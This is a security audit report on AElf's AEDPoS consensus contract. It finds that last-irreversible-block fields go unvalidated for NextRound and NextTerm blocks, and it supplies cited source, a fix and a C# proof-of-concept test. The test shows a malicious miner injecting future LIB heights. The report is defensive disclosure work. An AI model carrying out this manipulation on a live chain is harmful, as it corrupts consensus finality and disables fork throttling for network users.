# Audit Report

## Title
Missing LIB Validation in NextRound/NextTerm Allows Future Irreversible Block Heights to Persist in Consensus State

## Summary
The AEDPoS consensus contract validates Last Irreversible Block (LIB) fields only for `UpdateValue` behavior but not for `NextRound` or `NextTerm` behaviors. A malicious miner can inject arbitrary future LIB heights when producing NextRound/NextTerm blocks, permanently corrupting consensus state and disabling critical block production throttling mechanisms.

## Finding Description

The consensus validation system applies different validation providers based on the behavior type. The `LibInformationValidationProvider` ensures LIB fields cannot move backwards, but it is only applied to `UpdateValue` behavior. [1](#0-0) 

For `NextRound` and `NextTerm` behaviors, only `RoundTerminateValidationProvider` is added, which validates round/term number increments and InValue fields but does not validate LIB fields. [2](#0-1) 

The round hash validation performed in `ValidateAfterExecution` cannot detect LIB manipulation because the `GetCheckableRound` method excludes LIB fields from the hash computation. [3](#0-2) 

When generating a new round, the LIB fields are copied from the current round without recalculation. [4](#0-3) 

The `NextRoundInput` and `NextTermInput` structures include LIB fields, allowing them to be transmitted and stored. [5](#0-4) [6](#0-5) 

The corrupted round is stored directly without LIB recalculation or validation. [7](#0-6) [8](#0-7) 

## Impact Explanation

**Block Production Throttling Bypass**: The `GetMaximumBlocksCount` method uses LIB round number to evaluate blockchain mining status and throttle block production when the chain is experiencing excessive forking. [9](#0-8) 

With a corrupted future LIB round number (e.g., `libRoundNumber = 200` when `currentRoundNumber = 101`), the blockchain mining status evaluator incorrectly returns "Normal" status, bypassing throttling mechanisms designed to prevent excessive forking.

**Permanent State Corruption**: The `ProcessUpdateValue` method only updates LIB if the calculated value exceeds the stored value. [10](#0-9) 

A future LIB height (e.g., 1,000,000) will never be exceeded by legitimate calculations, making the corruption permanent. Future rounds continue copying the corrupted values forward, spreading the corruption across all subsequent consensus states.

**Consensus Integrity Violation**: The core consensus invariant that LIB height accurately reflects blockchain finality is permanently broken, potentially affecting cross-chain operations that rely on LIB for finality guarantees.

## Likelihood Explanation

**Attacker Prerequisites**: 
- Must be a valid miner in the active miner set (achievable for malicious validators)
- Must be scheduled to produce a NextRound or NextTerm block

**Attack Execution**:
- When producing a NextRound/NextTerm block, the miner receives consensus extra data containing legitimate LIB values
- Before including the data in the block, the miner modifies `ConfirmedIrreversibleBlockHeight` and `ConfirmedIrreversibleBlockRoundNumber` to arbitrary future values
- The modified data passes all validations and is permanently stored

**Frequency**: NextRound blocks occur every round during normal operation, providing regular opportunities for exploitation. NextTerm blocks occur at term boundaries, which are less frequent but still predictable.

**Detection Difficulty**: The attack produces no validation failures, events, or logs indicating manipulation. Detection requires manual inspection of consensus state and comparison with actual blockchain height.

## Recommendation

Add `LibInformationValidationProvider` to the validation pipeline for `NextRound` and `NextTerm` behaviors:

```csharp
case AElfConsensusBehaviour.NextRound:
    validationProviders.Add(new NextRoundMiningOrderValidationProvider());
    validationProviders.Add(new RoundTerminateValidationProvider());
    validationProviders.Add(new LibInformationValidationProvider()); // Add this
    break;
case AElfConsensusBehaviour.NextTerm:
    validationProviders.Add(new RoundTerminateValidationProvider());
    validationProviders.Add(new LibInformationValidationProvider()); // Add this
    break;
```

Alternatively, include LIB fields in the hash validation by modifying `GetCheckableRound` to preserve these fields, though this would be a more invasive change affecting the hash computation protocol.

## Proof of Concept

```csharp
[Fact]
public async Task MaliciousMiner_CanInjectFutureLIB_InNextRoundBlock()
{
    // Setup: Initialize consensus with normal round
    var initialMinerList = await InitialMinerListAsync();
    var firstRound = await BootMinerAsync();
    
    // Get current LIB values (legitimate)
    var currentRound = await ConsensusStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var legitimateLIBHeight = currentRound.ConfirmedIrreversibleBlockHeight;
    var legitimateLIBRound = currentRound.ConfirmedIrreversibleBlockRoundNumber;
    
    // Malicious miner generates NextRound consensus data
    var maliciousMinerKeyPair = initialMinerList[0];
    var triggerInfo = new AElfConsensusTriggerInformation
    {
        Pubkey = ByteString.CopyFrom(maliciousMinerKeyPair.PublicKey),
        Behaviour = AElfConsensusBehaviour.NextRound
    };
    
    var extraData = await GetConsensusExtraDataAsync(triggerInfo);
    var headerInfo = AElfConsensusHeaderInformation.Parser.ParseFrom(extraData.Value);
    
    // ATTACK: Modify LIB to future values before including in block
    headerInfo.Round.ConfirmedIrreversibleBlockHeight = 1000000; // Future height
    headerInfo.Round.ConfirmedIrreversibleBlockRoundNumber = 500; // Future round
    
    // Generate and execute NextRound transaction with corrupted data
    var txList = await GenerateConsensusTransactionsAsync(triggerInfo);
    var nextRoundTx = txList.Transactions[0];
    
    // Modify transaction to include corrupted LIB values
    var nextRoundInput = NextRoundInput.Parser.ParseFrom(nextRoundTx.Params);
    nextRoundInput.ConfirmedIrreversibleBlockHeight = 1000000;
    nextRoundInput.ConfirmedIrreversibleBlockRoundNumber = 500;
    
    // Execute transaction - should succeed despite corrupted LIB
    var result = await ConsensusStub.NextRound.SendAsync(nextRoundInput);
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify corruption persisted in state
    var corruptedRound = await ConsensusStub.GetCurrentRoundInformation.CallAsync(new Empty());
    corruptedRound.ConfirmedIrreversibleBlockHeight.ShouldBe(1000000);
    corruptedRound.ConfirmedIrreversibleBlockRoundNumber.ShouldBe(500);
    
    // Verify throttling mechanism is broken
    var maxBlocks = await ConsensusStub.GetMaximumBlocksCount.CallAsync(new Empty());
    // Should be throttled due to LIB lag, but returns max count due to corrupted future LIB
    maxBlocks.Value.ShouldBe(AEDPoSContractConstants.MaximumTinyBlocksCount);
    
    // Verify corruption persists across subsequent rounds
    await ProduceNormalBlocksAsync(5);
    var futureRound = await ConsensusStub.GetCurrentRoundInformation.CallAsync(new Empty());
    futureRound.ConfirmedIrreversibleBlockHeight.ShouldBe(1000000); // Still corrupted
}
```

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L77-92)
```csharp
        switch (extraData.Behaviour)
        {
            case AElfConsensusBehaviour.UpdateValue:
                validationProviders.Add(new UpdateValueValidationProvider());
                // Is confirmed lib height and lib round number went down? (Which should not happens.)
                validationProviders.Add(new LibInformationValidationProvider());
                break;
            case AElfConsensusBehaviour.NextRound:
                // Is sender's order of next round correct?
                validationProviders.Add(new NextRoundMiningOrderValidationProvider());
                validationProviders.Add(new RoundTerminateValidationProvider());
                break;
            case AElfConsensusBehaviour.NextTerm:
                validationProviders.Add(new RoundTerminateValidationProvider());
                break;
        }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/RoundTerminateValidationProvider.cs (L22-47)
```csharp
    private ValidationResult ValidationForNextRound(ConsensusValidationContext validationContext)
    {
        // Is next round information correct?
        // Currently two aspects:
        //   Round Number
        //   In Values Should Be Null
        var extraData = validationContext.ExtraData;
        if (validationContext.BaseRound.RoundNumber.Add(1) != extraData.Round.RoundNumber)
            return new ValidationResult { Message = "Incorrect round number for next round." };

        return extraData.Round.RealTimeMinersInformation.Values.Any(m => m.InValue != null)
            ? new ValidationResult { Message = "Incorrect next round information." }
            : new ValidationResult { Success = true };
    }

    private ValidationResult ValidationForNextTerm(ConsensusValidationContext validationContext)
    {
        var extraData = validationContext.ExtraData;
        var validationResult = ValidationForNextRound(validationContext);
        if (!validationResult.Success) return validationResult;

        // Is next term number correct?
        return validationContext.BaseRound.TermNumber.Add(1) != extraData.Round.TermNumber
            ? new ValidationResult { Message = "Incorrect term number for next round." }
            : new ValidationResult { Success = true };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L185-207)
```csharp
    private byte[] GetCheckableRound(bool isContainPreviousInValue = true)
    {
        var minersInformation = new Dictionary<string, MinerInRound>();
        foreach (var minerInRound in RealTimeMinersInformation.Clone())
        {
            var checkableMinerInRound = minerInRound.Value.Clone();
            checkableMinerInRound.EncryptedPieces.Clear();
            checkableMinerInRound.DecryptedPieces.Clear();
            checkableMinerInRound.ActualMiningTimes.Clear();
            if (!isContainPreviousInValue) checkableMinerInRound.PreviousInValue = Hash.Empty;

            minersInformation.Add(minerInRound.Key, checkableMinerInRound);
        }

        var checkableRound = new Round
        {
            RoundNumber = RoundNumber,
            TermNumber = TermNumber,
            RealTimeMinersInformation = { minersInformation },
            BlockchainAge = BlockchainAge
        };
        return checkableRound.ToByteArray();
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L69-70)
```csharp
        nextRound.ConfirmedIrreversibleBlockHeight = ConfirmedIrreversibleBlockHeight;
        nextRound.ConfirmedIrreversibleBlockRoundNumber = ConfirmedIrreversibleBlockRoundNumber;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/NextRoundInput.cs (L16-17)
```csharp
            ConfirmedIrreversibleBlockHeight = round.ConfirmedIrreversibleBlockHeight,
            ConfirmedIrreversibleBlockRoundNumber = round.ConfirmedIrreversibleBlockRoundNumber,
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/NextRoundInput.cs (L34-35)
```csharp
            ConfirmedIrreversibleBlockHeight = ConfirmedIrreversibleBlockHeight,
            ConfirmedIrreversibleBlockRoundNumber = ConfirmedIrreversibleBlockRoundNumber,
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L108-159)
```csharp
    private void ProcessNextRound(NextRoundInput input)
    {
        var nextRound = input.ToRound();
        
        RecordMinedMinerListOfCurrentRound();

        TryToGetCurrentRoundInformation(out var currentRound);

        // Do some other stuff during the first time to change round.
        if (currentRound.RoundNumber == 1)
        {
            // Set blockchain start timestamp.
            var actualBlockchainStartTimestamp =
                currentRound.FirstActualMiner()?.ActualMiningTimes.FirstOrDefault() ??
                Context.CurrentBlockTime;
            SetBlockchainStartTimestamp(actualBlockchainStartTimestamp);

            // Initialize current miners' information in Election Contract.
            if (State.IsMainChain.Value)
            {
                var minersCount = GetMinersCount(nextRound);
                if (minersCount != 0 && State.ElectionContract.Value != null)
                {
                    State.ElectionContract.UpdateMinersCount.Send(new UpdateMinersCountInput
                    {
                        MinersCount = minersCount
                    });
                }
            }
        }

        if (State.IsMainChain.Value && // Only detect evil miners in Main Chain.
            currentRound.TryToDetectEvilMiners(out var evilMiners))
        {
            Context.LogDebug(() => "Evil miners detected.");
            foreach (var evilMiner in evilMiners)
            {
                Context.LogDebug(() =>
                    $"Evil miner {evilMiner}, missed time slots: {currentRound.RealTimeMinersInformation[evilMiner].MissedTimeSlots}.");
                // Mark these evil miners.
                State.ElectionContract.UpdateCandidateInformation.Send(new UpdateCandidateInformationInput
                {
                    Pubkey = evilMiner,
                    IsEvilNode = true
                });
            }
        }

        AddRoundInformation(nextRound);

        Assert(TryToUpdateRoundNumber(nextRound.RoundNumber), "Failed to update round number.");
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L266-282)
```csharp
        if (TryToGetPreviousRoundInformation(out var previousRound))
        {
            new LastIrreversibleBlockHeightCalculator(currentRound, previousRound).Deconstruct(
                out var libHeight);
            Context.LogDebug(() => $"Finished calculation of lib height: {libHeight}");
            // LIB height can't be available if it is lower than last time.
            if (currentRound.ConfirmedIrreversibleBlockHeight < libHeight)
            {
                Context.LogDebug(() => $"New lib height: {libHeight}");
                Context.Fire(new IrreversibleBlockFound
                {
                    IrreversibleBlockHeight = libHeight
                });
                currentRound.ConfirmedIrreversibleBlockHeight = libHeight;
                currentRound.ConfirmedIrreversibleBlockRoundNumber = currentRound.RoundNumber.Sub(1);
            }
        }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_HelpMethods.cs (L103-105)
```csharp
    private void AddRoundInformation(Round round)
    {
        State.Rounds.Set(round.RoundNumber, round);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_GetMaximumBlocksCount.cs (L22-79)
```csharp
    private int GetMaximumBlocksCount()
    {
        TryToGetCurrentRoundInformation(out var currentRound);
        var libRoundNumber = currentRound.ConfirmedIrreversibleBlockRoundNumber;
        var libBlockHeight = currentRound.ConfirmedIrreversibleBlockHeight;
        var currentHeight = Context.CurrentHeight;
        var currentRoundNumber = currentRound.RoundNumber;

        Context.LogDebug(() =>
            $"Calculating max blocks count based on:\nR_LIB: {libRoundNumber}\nH_LIB:{libBlockHeight}\nR:{currentRoundNumber}\nH:{currentHeight}");

        if (libRoundNumber == 0) return AEDPoSContractConstants.MaximumTinyBlocksCount;

        var blockchainMiningStatusEvaluator = new BlockchainMiningStatusEvaluator(libRoundNumber,
            currentRoundNumber, AEDPoSContractConstants.MaximumTinyBlocksCount);
        blockchainMiningStatusEvaluator.Deconstruct(out var blockchainMiningStatus);

        Context.LogDebug(() => $"Current blockchain mining status: {blockchainMiningStatus.ToString()}");

        // If R_LIB + 2 < R < R_LIB + CB1, CB goes to Min(T(L2 * (CB1 - (R - R_LIB)) / A), CB0), while CT stays same as before.
        if (blockchainMiningStatus == BlockchainMiningStatus.Abnormal)
        {
            var previousRoundMinedMinerList = State.MinedMinerListMap[currentRoundNumber.Sub(1)].Pubkeys;
            var previousPreviousRoundMinedMinerList = State.MinedMinerListMap[currentRoundNumber.Sub(2)].Pubkeys;
            var minersOfLastTwoRounds = previousRoundMinedMinerList
                .Intersect(previousPreviousRoundMinedMinerList).Count();
            var factor = minersOfLastTwoRounds.Mul(
                blockchainMiningStatusEvaluator.SevereStatusRoundsThreshold.Sub(
                    (int)currentRoundNumber.Sub(libRoundNumber)));
            var count = Math.Min(AEDPoSContractConstants.MaximumTinyBlocksCount,
                Ceiling(factor, currentRound.RealTimeMinersInformation.Count));
            Context.LogDebug(() => $"Maximum blocks count tune to {count}");
            return count;
        }

        //If R >= R_LIB + CB1, CB goes to 1, and CT goes to 0
        if (blockchainMiningStatus == BlockchainMiningStatus.Severe)
        {
            // Fire an event to notify miner not package normal transaction.
            Context.Fire(new IrreversibleBlockHeightUnacceptable
            {
                DistanceToIrreversibleBlockHeight = currentHeight.Sub(libBlockHeight)
            });
            State.IsPreviousBlockInSevereStatus.Value = true;
            return 1;
        }

        if (!State.IsPreviousBlockInSevereStatus.Value)
            return AEDPoSContractConstants.MaximumTinyBlocksCount;

        Context.Fire(new IrreversibleBlockHeightUnacceptable
        {
            DistanceToIrreversibleBlockHeight = 0
        });
        State.IsPreviousBlockInSevereStatus.Value = false;

        return AEDPoSContractConstants.MaximumTinyBlocksCount;
    }
```
